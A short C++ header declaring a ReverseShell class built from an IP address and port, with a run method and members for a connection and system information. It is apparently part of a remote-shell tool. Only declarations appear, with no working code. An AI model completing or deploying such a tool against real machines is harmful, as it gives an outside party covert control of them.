#ifndef REVERSE_SHELL_H
#define REVERSE_SHELL_H

#include "Connection.h"
#include "SystemInfo.h"

class ReverseShell {
public:
    ReverseShell(const std::string& ip, int port);
    void run();

private:
    Connection conn;
    SystemInfo sysInfo;
};

#endif 
